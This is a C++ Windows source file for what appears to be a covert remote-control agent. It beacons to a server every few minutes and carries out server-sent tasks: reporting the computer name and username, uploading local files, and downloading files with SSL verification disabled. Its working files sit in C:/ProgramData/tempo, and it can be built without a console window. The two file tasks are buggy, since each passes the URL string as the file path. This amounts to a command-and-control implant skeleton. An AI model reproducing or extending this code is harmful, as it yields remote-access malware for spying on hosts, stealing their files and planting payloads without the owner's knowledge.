#include <iostream>
#include <fstream>
#include <conio.h>
#include <string>
#include <direct.h>
#include <Windows.h>
#include <stdio.h>
#include <thread>
#include <iomanip>
#include <chrono>
#include <ctime>

#include "libcurl/include/curl/curl.h"


#ifdef _DEBUG

#pragma comment(lib, "libcurl/lib/libcurl_a_debug.lib")
#else
#pragma comment(lib, "libcurl/lib/libcurl_a32.lib")
#endif







#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif


#define FILEPATH_MAX 200
#define POST_INIT "INIT"									//INIT;
#define POST_ALIVE "ALIVE"									//ALIVE;
#define POST_CONTROL "CONTROL"
#define POST_RESUME "RESUME"
#define POST_PRIORITY "PRIORITY"

#define TASK_INVALID -1
#define TASK_UNKNOWN 0
#define TASK_DONE 1
#define TASK_INIT "INIT"									//INIT;id=46;alive_delay_minitue=5;
#define TASK_SEND_COMPUTERNAME "SEND_COMPUTERNAME"			//SEND_COMPUTERNAME;
#define TASK_SEND_USERNAME "SEND_USERNAME"					//SEND_USERNAME
#define TASK_GET_FILE "GET_FILE"							//GET_FILE;url=http://cbdkj;path=C:/ProgramData/lklsd
#define TASK_SEND_FILE "SEND_FILE"

#define MAX_SEMAPHORE_COUNT 1

#define INFO_BUFFER_SIZE 32767

using namespace std;
/*
There's basically only one thing to keep in mind when using C++ instead of C when interfacing libcurl:
The callbacks CANNOT be non-static class member functions
Example C++ code:
class AClass {
	static size_t write_data(void *ptr, size_t size, size_t nmemb, void *ourpointer)
	{
		// do what you want with the data 
	}
 }
 */



 //#define MODE_SPLIT  //split large conections

/* notes
* 1. server must send data just in answer to post_control.
* 2. each seprated server post data must be in one line and seprates whit ";" 
* 
*/

HANDLE semaphore_alive;
HANDLE semaphore_resultfile;
HANDLE semaphore_checkresult;
DWORD dwWaitResult;
bool alive = TRUE;
int block_size_m = 1;
//char *server_url = "http://127.0.0.1:6789";
char *server_url = "http://127.0.0.1:6789/id=0";
//char *server_url = "http://192.168.1.148/Project2_agent/first.php";
char *client_id = "0";
char *serverurl_clientid="http://127.0.0.1:6789/id=0";
int alive_delay_min = 2;
CURL *curl_mainhandler;


void deleteNewed(void *str);
void freeMallocedMemory(void *str);
int task_do(string line);
void delete_done_task_synchronous(char result_filename[]);
char* string_to_charstar(string str);
void add_id_to_url() {
	char *temp = "/id=";
	serverurl_clientid = (char *)malloc(1 + strlen(server_url) + strlen(temp) + strlen(client_id));
	strcpy(serverurl_clientid, server_url);
	strcat(serverurl_clientid, temp);
	strcat(serverurl_clientid, client_id);
}

#pragma region curl
void forbid_reuse_connection(CURL *curl_mainhandler, bool forbid) {
	if (curl_mainhandler) {
		curl_easy_setopt(curl_mainhandler, CURLOPT_FORBID_REUSE, forbid);
	}
}

CURLcode modify_headers(CURL *curl_mainhandler) {

	struct curl_slist *headers = NULL; /* init to NULL is important */

	headers = curl_slist_append(headers, "Hey-server-hey: how are you?");
	headers = curl_slist_append(headers, "X-silly-content: yes");

	/* and if you think some of the internally generated headers, such as Accept : or Host :
	don't contain the data you want them to contain, you can replace them by simply setting them too:
	*/
	headers = curl_slist_append(headers, "Accept: Agent-007");
	headers = curl_slist_append(headers, "Host: munged.host.line");
	/*If you replace an existing header with one with no contents, you will prevent the header from being sent.
	For instance, if you want to completely prevent the "Accept:" header from being sent,
	you can disable it with code similar to this:
	*/
	headers = curl_slist_append(headers, "Accept:");


	/* pass our list of custom made headers */
	curl_easy_setopt(curl_mainhandler, CURLOPT_HTTPHEADER, headers);

	/*other settings and transfer http */
	//... 
	CURLcode res = curl_easy_perform(curl_mainhandler);

	curl_slist_free_all(headers); /* free the header list */

	return res;
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {

	size_t written = fwrite(ptr, size, nmemb, stream);
	return written;
}
size_t read_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {

	if (size*nmemb < 1)
		return 0;

	size_t read = fread(ptr, size, nmemb, stream);
	return read;
}
struct url_data {
	size_t size;
	char* data;
};
size_t write_data_charstar(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
	size_t index = data->size;
	size_t n = (size * nmemb);
	char* tmp;

	data->size += (size * nmemb);

	tmp = (char *)realloc(data->data, data->size + 1); /* +1 for '\0' */

	if (tmp) {
		data->data = tmp;
	}
	else {
		if (data->data) {
			free(data->data);
		}
		fprintf(stderr, "Failed to allocate memory.\n");
		return 0;
	}

	memcpy((data->data + index), ptr, n);
	data->data[data->size] = '\0';

	return size * nmemb;
}

CURLcode get_skipssl(CURL *curl_handler, char *url, char download_filename[]) {

	curl_easy_setopt(curl_mainhandler, CURLOPT_URL, url);
	//skip ssl cetification
	curl_easy_setopt(curl_mainhandler, CURLOPT_SSL_VERIFYPEER, FALSE);

	FILE *fp = fopen(download_filename, "wb");
	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEFUNCTION, write_data);
	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEDATA, fp);

	//		cause the library to spew out entire protocol detailes
	//curl_easy_setopt(curl_mainhandler, CURLOPT_VERBOSE, TRUE);
	//		if you want see header in output:
	//curl_easy_setopt(curl_mainhandler, CURLOPT_HEADER, TRUE);

	//this function blocks and calls callback functoin(write_data) frequently
	CURLcode res = curl_easy_perform(curl_mainhandler);

	fclose(fp);

	return res;
}

CURLcode post_file(CURL *curl_handler, char *url, char upload_filename[]) {
	struct url_data data;
	data.size = 0;
	data.data = (char *)malloc(1024); /* reasonable size initial buffer */
	if (NULL == data.data) {
		fprintf(stderr, "Failed to allocate memory.\n");
		//error
	}
	data.data[0] = '\0';
	//save response in data.data
	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEFUNCTION, write_data_charstar);
	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEDATA, &data);


	curl_easy_setopt(curl_mainhandler, CURLOPT_URL, url);
	curl_easy_setopt(curl_mainhandler, CURLOPT_POST, 1L);

	FILE *fpin = fopen(upload_filename, "rb");
	curl_easy_setopt(curl_mainhandler, CURLOPT_READFUNCTION, read_data);
	curl_easy_setopt(curl_mainhandler, CURLOPT_READDATA, fpin);

	
	CURLcode res = curl_easy_perform(curl_mainhandler); /* post away! */

	fclose(fpin);
	
	freeMallocedMemory(data.data);

	return res;
}
CURLcode post_control_synchronous(CURL *curl_handler, char *url, char *post_data, char result_filename[]) {
	WaitForSingleObject(semaphore_resultfile, INFINITE);

	curl_easy_setopt(curl_mainhandler, CURLOPT_URL, url);
	curl_easy_setopt(curl_mainhandler, CURLOPT_POSTFIELDS, post_data);
	curl_easy_setopt(curl_mainhandler, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data)); 

	FILE *fpout = fopen(result_filename, "ab+");
	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEFUNCTION, write_data);
	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEDATA, fpout);

	CURLcode res = curl_easy_perform(curl_mainhandler); /* post away! */

	fclose(fpout);

	ReleaseSemaphore(semaphore_resultfile, 1, NULL);

	return res;
}
CURLcode post_data(CURL *curl_handler, char *url, char *post_data) {
	struct url_data data;
	data.size = 0;
	data.data = (char *)malloc(1024); /* reasonable size initial buffer */
	if (NULL == data.data) {
		fprintf(stderr, "Failed to allocate memory.\n");
		//error
	}
	data.data[0] = '\0';
	//save response in data.data
	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEFUNCTION, write_data_charstar);
	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEDATA, &data);

	curl_easy_setopt(curl_mainhandler, CURLOPT_URL, url);
	curl_easy_setopt(curl_mainhandler, CURLOPT_POSTFIELDS, post_data);
	curl_easy_setopt(curl_mainhandler, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
	
	CURLcode res = curl_easy_perform(curl_mainhandler); /* post away! */

	freeMallocedMemory(data.data);
	return res;
}

#pragma endregion


void thread_alive_run(char *serverurl_clientid, char result_filename[], int alive_delay_min)
{

	WaitForSingleObject(semaphore_alive,INFINITE);
	ReleaseSemaphore(semaphore_alive, 1, NULL);

	CURL *curl_handler;
	curl_handler = curl_easy_init();

	if (curl_handler) {

		string tmp = POST_ALIVE;
		tmp += ";";
		char *ali = string_to_charstar(tmp);
		while (alive)
		{
			post_control_synchronous(curl_handler, serverurl_clientid, ali, result_filename);
			ReleaseSemaphore(semaphore_checkresult, 1, NULL);
			this_thread::sleep_for(chrono::minutes(alive_delay_min));
		}

		curl_easy_cleanup(curl_handler);
	}

}

void read_init(char init_filename[]) {

	ifstream infile;
	infile.open(init_filename);

	string line;
	size_t start;
	size_t end;
	string str;
	if (!getline(infile, line)) {
		return;
	}

	start = 0;
	end = line.find(";");
	str = line.substr(start, end);
	if (str.compare(TASK_INIT) != 0) { // 0 means equal
							   //this file is not for init
		return;
	}

	line = line.substr(end + 1);
	//sample: id=1616;
	start = line.find("id=");
	end = line.find(";");
	str = line.substr(start, end - start);
	client_id = string_to_charstar(str);
	add_id_to_url();

	line = line.substr(end + 1);
	//sample alive_delay_miniutes=5;
	start = line.find("alive_delay_miniutes=");
	end = line.find(";");
	str = line.substr(start, end - start);
	alive_delay_min = stoi(str, nullptr);

	//...

	infile.close();
}

void client_init(char init_filename[])
{

	string tmp = POST_INIT;
	tmp += ";";
	char *init = string_to_charstar(tmp);
	ifstream infile;
	infile.open(init_filename);
	//check if file exists and no error in stream
	if (!infile.good()) {
		infile.close();
		post_control_synchronous(curl_mainhandler, serverurl_clientid, init, init_filename);
		read_init(init_filename);
	}
	else {
		infile.close();
		read_init(init_filename);
		remove(init_filename);
		post_control_synchronous(curl_mainhandler, serverurl_clientid, init, init_filename);
		read_init(init_filename);
	}
}


void add_header_file(string header_data, char in_filename[])
{
	
}

void check_tasks(char result_filename[]) {

	ifstream infile;
	infile.open(result_filename);
	string line;
	bool task_done = FALSE;
	int task = TASK_UNKNOWN;
	if (getline(infile, line)) {

		task = task_do(line);
	}

	infile.close();

	if (task==TASK_INVALID || task== TASK_DONE) {
		delete_done_task_synchronous(result_filename);
	}
	
}

void getAndSend_computername() {

	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;
	if (GetComputerName(infoBuf, &bufCharCount)) {
		/*
		size_t wcstombs(
			char *mbstr,
			const wchar_t *wcstr,
			size_t count
		);
		*/
		char *name = (char *)malloc(INFO_BUFFER_SIZE);
		wcstombs(name, infoBuf, INFO_BUFFER_SIZE);

		post_data(curl_mainhandler, serverurl_clientid, name);

		freeMallocedMemory(name);
	}
}
void getAndSend_username() {

	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;
	if (GetUserName(infoBuf, &bufCharCount)) {

		char *name = (char *)malloc(INFO_BUFFER_SIZE);
		wcstombs(name, infoBuf, INFO_BUFFER_SIZE);

		post_data(curl_mainhandler, serverurl_clientid, name);

		freeMallocedMemory(name);
	}
}


int task_do(string line){
	
	if (line.length() < 1)
		return TASK_INVALID;
	size_t start;
	size_t end;
	string str;
	string str2;
	//sample: id=1616;
	end = line.find(";");
	str = line.substr(0, end);
	if (str.compare(TASK_SEND_COMPUTERNAME) == 0) {

		getAndSend_computername();
	}
	else if (str.compare(TASK_SEND_USERNAME) == 0) {
		getAndSend_username();
	}
	else if (str.compare(TASK_SEND_FILE) == 0) {
		line = line.substr(end +1);
		start = line.find("url=");
		end = line.find(";");
		str = line.substr(start, end - start);

		line = line.substr(end + 1);
		start = line.find("path=");
		end = line.find(";");
		str2 = line.substr(start, end - start);

		char * url = string_to_charstar(str);
		char * path = string_to_charstar(str);

		post_file(curl_mainhandler, url, path);

	}
	else if (str.compare(TASK_GET_FILE) == 0) {
		line = line.substr(end + 1);
		start = line.find("url=");
		end = line.find(";");
		str = line.substr(start, end - start);

		line = line.substr(end + 1);
		start = line.find("path=");
		end = line.find(";");
		str2 = line.substr(start, end - start);

		char * url = string_to_charstar(str);
		char * path = string_to_charstar(str);

		get_skipssl(curl_mainhandler, url, path);

	}
	else {
		return TASK_INVALID;
	}
	


	return TASK_DONE;
}

void delete_done_task_synchronous(char result_filename[])
{
	char temp_filename[FILENAME_MAX] = "C:/ProgramData/tempo/temp.txt";
	string line;
	ifstream infile;
	ofstream tempfile;

	WaitForSingleObject(semaphore_resultfile, INFINITE);
	
	infile.open(result_filename);
	tempfile.open(temp_filename);
	for (int i =0; getline(infile, line); i++)
	{
		if (i != 0) {
			tempfile << line << "\n";
		}
	}
	infile.close();
	tempfile.close();
	remove(result_filename);
	rename(temp_filename,result_filename);
	remove(temp_filename);
	ReleaseSemaphore(semaphore_resultfile, 1, NULL);
}

char* string_to_charstar(string str) {
	
	char *cstr = new char[str.length() + 1];
	strcpy(cstr, str.c_str()); //c_str() returns const char *
	return cstr;
}
void deleteNewed(void *str) {
	// This deallocates the memory previously allocated for "cstr".
	// If you use "new" to allocate memory, you must use "delete" to deallocate it.
	delete[] str;
}
void freeMallocedMemory(void *str) {
	free(str);
}


#define DEBUG
#ifdef DEBUG
	int main()
#else
	int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
#endif
{

//#define _TEST
#ifdef _TEST
		CURL *curl_handlerm;
		curl_handlerm = curl_easy_init();
		char *server_url2 = "http://192.168.1.148";
		char *data = POST_INIT;
		char result_filename2[FILENAME_MAX] = "C:/ProgramData/tempo/results.txt";
		forbid_reuse_connection(curl_handlerm, TRUE);
		//post_control_synchronous(curl_handlerm, server_url2, POST_INIT, result_filename2);
		//cout << "\nend.";
		_getch();
		return 0;
#endif



	
	//make a sub folder
	char outDir[FILENAME_MAX] = "C:/ProgramData/tempo";
	_mkdir(outDir);

	char clientsettings_filename[FILENAME_MAX] = "C:/ProgramData/tempo/settings.txt";
	char result_filename[FILENAME_MAX] = "C:/ProgramData/tempo/results.txt";
	char download_filename[FILENAME_MAX] = "C:/ProgramData/tempo/download.txt";
	char upload_filename[FILENAME_MAX] = "C:/ProgramData/tempo/upload.txt";
	
	CURLcode get_res;
	CURLcode upload_res;
	char *urlsecure = "https://192.168.1.201/easy.txt";
	char *urllarge = "http://www.bdu.ac.in/centers/uic/docs/courseware/C_Programming_Notes.pdf";
	char *urllocal = "http://127.0.0.1:6789/id=";
	char *urllocal2 = "http://192.168.1.148/Project2_agent/first.php";
	char *url = "http://www.google.com";
	
	semaphore_alive = CreateSemaphore(
		NULL,           // default security attributes
		MAX_SEMAPHORE_COUNT,  // initial count
		MAX_SEMAPHORE_COUNT,  // maximum count
		NULL);			// unnamed semaphore
	semaphore_resultfile = CreateSemaphore(NULL, MAX_SEMAPHORE_COUNT, MAX_SEMAPHORE_COUNT, NULL);
	semaphore_checkresult = CreateSemaphore(NULL, 0, MAX_SEMAPHORE_COUNT, NULL);

	dwWaitResult  = WaitForSingleObject(
		semaphore_alive,   // handle to semaphore
		INFINITE);		// time-out interval use 0L if dont want block
	/*if timer expires or semaphore signals:
	switch (dwWaitResult)
	{
		// The semaphore object was signaled.
	case WAIT_OBJECT_0:
		//...
		break;
		//The semaphore was nonsignaled, so a time-out occurred
	case WAIT_TIMEOUT:
		//...
		break;
	}
	*/

	add_id_to_url();
	
	thread thread_alive(thread_alive_run,
										serverurl_clientid, result_filename, alive_delay_min);

	curl_mainhandler = curl_easy_init();

	if (curl_mainhandler) {

		forbid_reuse_connection(curl_mainhandler, TRUE);
		
		//get init settings
		client_init(clientsettings_filename); //check if client has id
		//start reporting alive
		ReleaseSemaphore(
			semaphore_alive,  // handle to semaphore
			1,            // increase count by one
			NULL);       // not interested in previous count
		while (alive)
		{
			WaitForSingleObject(semaphore_checkresult, INFINITE);
			check_tasks(result_filename);
		}
		
		//free memory
		freeMallocedMemory(serverurl_clientid);
		deleteNewed(client_id);
		/* always cleanup one time at end*/
		curl_easy_cleanup(curl_mainhandler);
	}

	#ifdef _DEBUG
		cout << "\nend.";
		_getch();
	#endif
	
	//main thread must ends after end of other threads. if want main dont wait call thread_alive.detach()
	if (thread_alive.joinable())
	{
		thread_alive.join(); // main wait untill this thread finishes.
	}
	
	//close semophore handlers
	CloseHandle(semaphore_alive);
	CloseHandle(semaphore_resultfile);
	CloseHandle(semaphore_checkresult);

	return 0;
}